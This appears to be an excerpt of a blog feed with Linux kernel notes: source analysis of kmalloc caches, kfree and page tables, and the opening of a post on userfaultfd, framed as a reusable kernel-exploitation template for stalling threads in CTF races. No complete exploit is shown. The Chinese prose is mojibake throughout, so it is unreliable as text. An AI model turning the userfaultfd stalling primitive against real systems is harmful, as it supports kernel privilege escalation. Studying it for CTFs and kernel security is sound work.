kmalloc_info[];<br></code></pre></td></tr></table></figure><ul><li>nameï¼šslab cacheåå­—</li><li>sizeï¼šå†…å­˜å—å¤§å°</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmalloc_info_struct</span> <span class="hljs-title">kmalloc_info</span>[] __<span class="hljs-title">initconst</span> =</span> &#123;<br>&#123;<span class="hljs-literal">NULL</span>,                      <span class="hljs-number">0</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-96&quot;</span>,             <span class="hljs-number">96</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-192&quot;</span>,           <span class="hljs-number">192</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-8&quot;</span>,               <span class="hljs-number">8</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-16&quot;</span>,             <span class="hljs-number">16</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-32&quot;</span>,             <span class="hljs-number">32</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-64&quot;</span>,             <span class="hljs-number">64</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-128&quot;</span>,           <span class="hljs-number">128</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-256&quot;</span>,           <span class="hljs-number">256</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-512&quot;</span>,           <span class="hljs-number">512</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-1k&quot;</span>,           <span class="hljs-number">1024</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-2k&quot;</span>,           <span class="hljs-number">2048</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-4k&quot;</span>,           <span class="hljs-number">4096</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-8k&quot;</span>,           <span class="hljs-number">8192</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-16k&quot;</span>,         <span class="hljs-number">16384</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-32k&quot;</span>,         <span class="hljs-number">32768</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-64k&quot;</span>,         <span class="hljs-number">65536</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-128k&quot;</span>,       <span class="hljs-number">131072</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-256k&quot;</span>,       <span class="hljs-number">262144</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-512k&quot;</span>,       <span class="hljs-number">524288</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-1M&quot;</span>,        <span class="hljs-number">1048576</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-2M&quot;</span>,        <span class="hljs-number">2097152</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-4M&quot;</span>,        <span class="hljs-number">4194304</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-8M&quot;</span>,        <span class="hljs-number">8388608</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-16M&quot;</span>,      <span class="hljs-number">16777216</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-32M&quot;</span>,      <span class="hljs-number">33554432</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-64M&quot;</span>,      <span class="hljs-number">67108864</span>&#125;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>index &gt; 2 æ—¶sizeä¸º2 ^ index</li><li>ç”±äºå†…æ ¸å¤§éƒ¨åˆ†ç”³è¯·å¤§å°éƒ½åœ¨192å’Œ96å·¦å³æ‰€ä»¥å•ç‹¬æä¾›è¿™ä¸¤ç§å¤§å°çš„slab cache</li></ul><p>size_index[24]æ•°ç»„ç”¨äºå®šä¹‰å°äº192å¤§å°çš„å†…å­˜å—çš„å¤§å°é€‰å–è§„åˆ™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> u8 size_index[<span class="hljs-number">24</span>] __ro_after_init = &#123;<br><span class="hljs-number">3</span>,<span class="hljs-comment">/* 8 */</span><br><span class="hljs-number">4</span>,<span class="hljs-comment">/* 16 */</span><br><span class="hljs-number">5</span>,<span class="hljs-comment">/* 24 */</span><br><span class="hljs-number">5</span>,<span class="hljs-comment">/* 32 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 40 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 48 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 56 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 64 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 72 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 80 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 88 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 96 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 104 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 112 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 120 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 128 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 136 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 144 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 152 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 160 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 168 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 176 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 184 */</span><br><span class="hljs-number">2</span><span class="hljs-comment">/* 192 */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>æ³¨é‡Šå†…æ˜¯ç”³è¯·å¤§å°ï¼Œæ•°ç»„å…ƒç´ æ˜¯slab cacheå¯¹åº”ä¸‹æ ‡</p><p>ç”³è¯·å°ºå¯¸å¤§äº192æ—¶ä½¿ç”¨flså‡½æ•°è®¡ç®—ï¼Œflså¯ä»¥è·å–å‚æ•°çš„æœ€é«˜æœ‰æ•ˆbitçš„ä½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * fls = Find Last Set in word</span><br><span class="hljs-comment"> * @result: [1-32]</span><br><span class="hljs-comment"> * fls(1) = 1, fls(0x80000000) = 32, fls(0) = 0</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> __attribute__ ((<span class="hljs-type">const</span>)) <span class="hljs-type">int</span> <span class="hljs-title function_">fls</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> x)</span><br>&#123;<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(</span><br><span class="hljs-params"><span class="hljs-string">&quot;fls.f%0, %1\n&quot;</span>  <span class="hljs-comment">/* 0:31; 0(Z) if src 0 */</span></span><br><span class="hljs-params"><span class="hljs-string">&quot;add.nz%0, %0, 1\n&quot;</span>  <span class="hljs-comment">/* 0:31 -&gt; 1:32 */</span></span><br><span class="hljs-params">: <span class="hljs-string">&quot;=r&quot;</span>(n)<span class="hljs-comment">/* Early clobber not needed */</span></span><br><span class="hljs-params">: <span class="hljs-string">&quot;r&quot;</span>(x)</span><br><span class="hljs-params">: <span class="hljs-string">&quot;cc&quot;</span>)</span>;<br><br><span class="hljs-keyword">return</span> n;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="kmallocæ¶æ„"><a href="#kmallocæ¶æ„" class="headerlink" title="kmallocæ¶æ„"></a>kmallocæ¶æ„</h3><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/kmalloc%E5%86%85%E5%AD%98%E6%B1%A0.jpg" class title="kmallocå†…å­˜æ± "><p>æ‰€æœ‰çš„kmem_cacheå‚¨å­˜åœ¨ä¸€ä¸ªå…¨å±€æ•°ç»„ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *</span><br><span class="hljs-class"><span class="hljs-title">kmalloc_caches</span>[<span class="hljs-title">NR_KMALLOC_TYPES</span>][<span class="hljs-title">KMALLOC_SHIFT_HIGH</span> + 1] __<span class="hljs-title">ro_after_init</span> =</span><br>&#123; <span class="hljs-comment">/* initialization for https://bugs.llvm.org/show_bug.cgi?id=42570 */</span> &#125;;<br>EXPORT_SYMBOL(kmalloc_caches);<br></code></pre></td></tr></table></figure><ul><li><p>ç¬¬ä¸€ä¸ªä¸‹æ ‡è¡¨ç¤ºç‰©ç†å†…å­˜åŒºåŸŸç±»å‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">kmalloc_cache_type</span> &#123;</span><br>KMALLOC_NORMAL = <span class="hljs-number">0</span>,<br>KMALLOC_RECLAIM,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ZONE_DMA</span><br>KMALLOC_DMA,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>NR_KMALLOC_TYPES<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>ç¬¬äºŒä¸ªä¸‹æ ‡è¡¨ç¤ºslab cache</p></li></ul><h3 id="kmallocä½“ç³»çš„åˆ›å»º"><a href="#kmallocä½“ç³»çš„åˆ›å»º" class="headerlink" title="kmallocä½“ç³»çš„åˆ›å»º"></a>kmallocä½“ç³»çš„åˆ›å»º</h3><p>å‡½æ•°è°ƒç”¨æµç¨‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">start_kernel -&gt; mm_init -&gt; kmem_cache_init<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __init <span class="hljs-title function_">kmem_cache_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* slab allocatorä½“ç³»çš„åˆ›å»ºåˆå§‹åŒ– */</span><br><span class="hljs-comment">/* Now we can use the kmem_cache to allocate kmalloc slabs */</span><br>setup_kmalloc_cache_index_table();<br>create_kmalloc_caches(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸»è¦å°±æ˜¯ä¸¤ä¸ªå‡½æ•°</p><ul><li>setup_kmalloc_cache_index_tableï¼šåˆå§‹åŒ–size_indexæ•°ç»„</li><li>create_kmalloc_cachesï¼šåˆ›å»ºåˆå§‹åŒ–kmalloc_cachesäºŒç»´æ•°ç»„</li></ul><h3 id="kmallocå†…å­˜æ± çš„åˆ†é…å’Œå›æ”¶"><a href="#kmallocå†…å­˜æ± çš„åˆ†é…å’Œå›æ”¶" class="headerlink" title="kmallocå†…å­˜æ± çš„åˆ†é…å’Œå›æ”¶"></a>kmallocå†…å­˜æ± çš„åˆ†é…å’Œå›æ”¶</h3><p>kmallocåˆ†é…</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/kmalloc_alloc.jpg" class title="kmalloc_alloc"><p>kfreeå›æ”¶ï¼ˆè¿‡äºç®€å•ç”šè‡³ä¸é…æ‹¥æœ‰ä¸€å¼ å›¾ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">kfree</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *x)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">void</span> *object = (<span class="hljs-type">void</span> *)x;<br><br>page = virt_to_head_page(x);<br><span class="hljs-keyword">if</span> (unlikely(!PageSlab(page))) &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order = compound_order(page);<br><br>BUG_ON(!PageCompound(page));<br>kfree_hook(object);<br>mod_node_page_state(page_pgdat(page), NR_SLAB_UNRECLAIMABLE,<br>    -(<span class="hljs-number">1</span> &lt;&lt; order));<br>__free_pages(page, order);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>slab_free(page-&gt;slab_cache, page, object, <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, _RET_IP_);<br>&#125;<br>EXPORT_SYMBOL(kfree);<br></code></pre></td></tr></table></figure><ul><li>ä½¿ç”¨virt_to_head_pageå‡½æ•°å°†è™šæ‹Ÿåœ°å€è½¬åŒ–ä¸ºpageç»“æ„ä½“</li><li>é€šè¿‡PageSlabæŸ¥çœ‹pageçš„æ˜¯å¦è®¾ç½®PG_slabæ ‡è¯†<ul><li>æ²¡æœ‰åˆ™æ˜¯ä»buddy systemä¸­åˆ†é…çš„ï¼Œä½¿ç”¨__free_pagesæ”¾å›buddy system</li><li>å¦åˆ™è°ƒç”¨slab_freeæ”¾å›å¯¹åº”slab</li></ul></li></ul><h1 id="é¡µè¡¨ä½“ç³»"><a href="#é¡µè¡¨ä½“ç³»" class="headerlink" title="é¡µè¡¨ä½“ç³»"></a>é¡µè¡¨ä½“ç³»</h1><p>å°±æ”¾ä¸¤å¼ å›¾ï¼Œè°ƒè¯•å¯åŠ¨æµç¨‹çš„æ—¶å€™å¯¹è¿™ç©æ„æœ‰æ·±åˆ»çš„è®¤è¯†äº†(Ë‰â–½Ë‰ï¼›)â€¦</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/%E5%9B%9B%E7%BA%A7%E9%A1%B5%E8%A1%A8.png" class title="å››çº§é¡µè¡¨"><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/%E5%9B%9B%E7%BA%A7%E9%A1%B5%E8%A1%A82.png" class title="å››çº§é¡µè¡¨2">]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>Source Code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>source code</tag>
      
      <tag>memory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>userfaultfd</title>
    <link href="/2023/11/08/kernel-userfaultfd/"/>
    <url>/2023/11/08/kernel-userfaultfd/</url>
    
    <content type="html"><![CDATA[<p>é‡å¯kernelï¼</p><p>å‘ç°æˆ‘çœŸçš„å¾ˆå®¹æ˜“é’»ç‰›è§’å°–(Ë‰â–½Ë‰ï¼›)â€¦ï¼Œä¹‹åçš„å­¦ä¹ ä¼šä»¥åšå‡ºé¢˜ä¸ºç¬¬ä¸€ç›®æ ‡</p><span id="more"></span><h1 id="userfaultfdæœºåˆ¶"><a href="#userfaultfdæœºåˆ¶" class="headerlink" title="userfaultfdæœºåˆ¶"></a>userfaultfdæœºåˆ¶</h1><p>linuxçš„ä¸€ç§ç¼ºé¡µå¤„ç†æœºåˆ¶ï¼Œå¯ä»¥ç”¨æˆ·æ€è‡ªå®šä¹‰å‡½æ•°å¤„ç†ç¼ºé¡µå¤„ç†æœºåˆ¶</p><p>æ”¾ä¸€å¼ å…¸ä¸­å…¸çš„å›¾</p><img src="/2023/11/08/kernel-userfaultfd/%E5%85%B8%E4%B8%AD%E5%85%B8.png" class title="å…¸ä¸­å…¸"><p>ä½¿ç”¨userfaultfdç³»ç»Ÿè°ƒç”¨éœ€è¦ï¼š</p><ul><li>æ³¨å†Œä¸€ä¸ªuserfaultfdï¼Œé€šè¿‡ioctlç›‘è§†ä¸€å—å†…å­˜</li><li>å¯åŠ¨ä¸€ä¸ªç”¨äºè½®è¯¢çš„çº¿ç¨‹uffd monitorï¼Œè¯¥çº¿ç¨‹é€šè¿‡pollä¸æ–­è½®è¯¢ç›´åˆ°å‡ºç°ç¼ºé¡µå¼‚å¸¸</li></ul><p>å¤§è‡´æµç¨‹ï¼š</p><ul><li><p>æŸä¸ªçº¿ç¨‹åœ¨è¢«ç›‘è§†å†…å­˜äº§ç”Ÿç¼ºé¡µå¼‚å¸¸ï¼ˆæ¯”å¦‚ç¬¬ä¸€æ¬¡è®¿é—®ä¸€ä¸ªåŒ¿åé¡µï¼‰ï¼Œè¯¥çº¿ç¨‹ï¼ˆfaultingçº¿ç¨‹ï¼‰è¿›å…¥å†…æ ¸å¤„ç†ç¼ºé¡µå¼‚å¸¸</p></li><li><p>å†…æ ¸è°ƒç”¨handle_userfaultäº¤ç”±userfaultfdå¤„ç†</p></li><li><p>userfaultfdå°†faultingçº¿ç¨‹ä¼‘çœ ï¼Œå¹¶å‘é€ä¸€ä¸ªuffd_msgç»™monitorçº¿ç¨‹ï¼Œç­‰å¾…å…¶å¤„ç†ç»“æŸ</p></li><li><p>monitorçº¿ç¨‹æ‰§è¡Œå¯¹åº”å‡½æ•°ï¼Œå¹¶åœ¨ioctlå¤„ç†ç¼ºé¡µå¼‚å¸¸å®Œæ¯•åå‘é€ä¿¡å·å”¤é†’faultingçº¿ç¨‹</p><p>ioctlé€‰é¡¹ï¼š</p><ul><li>UFFDIO_COPYï¼šå°†ç”¨æˆ·è‡ªå®šä¹‰æ•°æ®æ‹·è´åˆ°faulting pageä¸Š</li><li>UFFDIO_ZEROPAGEï¼šå°†faulting pageç½®0</li><li>UFFDIO_WAKEï¼šç”¨äºé…åˆä¸Šé¢ä¸¤é¡¹ä¸­UFFDIO_COPY_MODE_DONTWAKEå’ŒUFFDIO_ZEROPAGE_MODE_DONTWAKEæ¨¡å¼å®ç°æ‰¹é‡å¡«å……</li></ul></li></ul><h1 id="userfaultfdç”¨æ³•ï¼ˆkernelæ¿å­ï¼‰"><a href="#userfaultfdç”¨æ³•ï¼ˆkernelæ¿å­ï¼‰" class="headerlink" title="userfaultfdç”¨æ³•ï¼ˆkernelæ¿å­ï¼‰"></a>userfaultfdç”¨æ³•ï¼ˆkernelæ¿å­ï¼‰</h1><h2 id="ç›¸å…³å®å®šä¹‰ï¼Œç»“æ„ä½“"><a href="#ç›¸å…³å®å®šä¹‰ï¼Œç»“æ„ä½“" class="headerlink" title="ç›¸å…³å®å®šä¹‰ï¼Œç»“æ„ä½“"></a>ç›¸å…³å®å®šä¹‰ï¼Œç»“æ„ä½“</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFD_API ((uint64_t)0xAA)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _UFFDIO_REGISTER(0x00)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _UFFDIO_COPY(0x03)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _UFFDIO_API(0x3F)</span><br><br><span class="hljs-comment">/* userfaultfd ioctl ids */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFDIO 0xAA</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFDIO_API_IOWR(UFFDIO, _UFFDIO_API,\</span><br><span class="hljs-meta">      struct uffdio_api)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFDIO_REGISTER_IOWR(UFFDIO, _UFFDIO_REGISTER, \</span><br><span class="hljs-meta">      struct uffdio_register)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFDIO_COPY_IOWR(UFFDIO, _UFFDIO_COPY,\</span><br><span class="hljs-meta">      struct uffdio_copy)</span><br><br><span class="hljs-comment">/* read() structure */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> &#123;</span><br><span class="hljs-type">uint8_t</span>event;<br><br><span class="hljs-type">uint8_t</span>reserved1;<br><span class="hljs-type">uint16_t</span>reserved2;<br><span class="hljs-type">uint32_t</span>reserved3;<br><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">uint64_t</span>flags;<br><span class="hljs-type">uint64_t</span>address;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-type">uint32_t</span> ptid;<br>&#125; feat;<br>&#125; pagefault;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">uint32_t</span>ufd;<br>&#125; fork;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">uint64_t</span>from;<br><span class="hljs-type">uint64_t</span>to;<br><span class="hljs-type">uint64_t</span>len;<br>&#125; remap;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">uint64_t</span>start;<br><span class="hljs-type">uint64_t</span>end;<br>&#125; remove;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-comment">/* unused reserved fields */</span><br><span class="hljs-type">uint64_t</span>reserved1;<br><span class="hljs-type">uint64_t</span>reserved2;<br><span class="hljs-type">uint64_t</span>reserved3;<br>&#125; reserved;<br>&#125; arg;<br>&#125; __attribute__((packed));<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFD_EVENT_PAGEFAULT0x12</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span> api;<br>    <span class="hljs-type">uint64_t</span> features;<br>    <span class="hljs-type">uint64_t</span> ioctls;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_range</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span> start;<br>    <span class="hljs-type">uint64_t</span> len;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_range</span> <span class="hljs-title">range</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFDIO_REGISTER_MODE_MISSING((uint64_t)1&lt;&lt;0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFDIO_REGISTER_MODE_WP((uint64_t)1&lt;&lt;1)</span><br>    <span class="hljs-type">uint64_t</span> mode;<br>    <span class="hljs-type">uint64_t</span> ioctls;<br>&#125;;<br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> &#123;</span><br><span class="hljs-type">uint64_t</span> dst;<br><span class="hljs-type">uint64_t</span> src;<br><span class="hljs-type">uint64_t</span> len;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFDIO_COPY_MODE_DONTWAKE((uint64_t)1&lt;&lt;0)</span><br><span class="hljs-type">uint64_t</span> mode;<br><span class="hljs-type">int64_t</span> copy;<br>&#125;;<br><br><span class="hljs-comment">//#include &lt;linux/userfaultfd.h&gt;</span><br><br><span class="hljs-type">char</span> temp_page_for_stuck[<span class="hljs-number">0x1000</span>];<br></code></pre></td></tr></table></figure><h2 id="register-userfaultfd-for-thread-stucking"><a href="#register-userfaultfd-for-thread-stucking" class="headerlink" title="register_userfaultfd_for_thread_stucking"></a>register_userfaultfd_for_thread_stucking</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">register_userfaultfd_for_thread_stucking</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> *monitor_thread, </span><br><span class="hljs-params">                                          <span class="hljs-type">void</span> *buf, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len)</span><br>&#123;<br>    register_userfaultfd(monitor_thread, buf, len, <br>                         uffd_handler_for_stucking_thread);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>åˆ›å»ºä¸€ä¸ªuffd</li><li>è®¾ç½®apiï¼Œåˆå§‹åŒ–uffdæ¥å£å¹¶è·å–å…¶æ”¯æŒçš„ç‰¹æ€§</li><li>æ³¨å†Œç›‘è§†çš„å†…å­˜åŒºåŸŸ</li><li>åˆ›å»ºmonitorçº¿ç¨‹</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 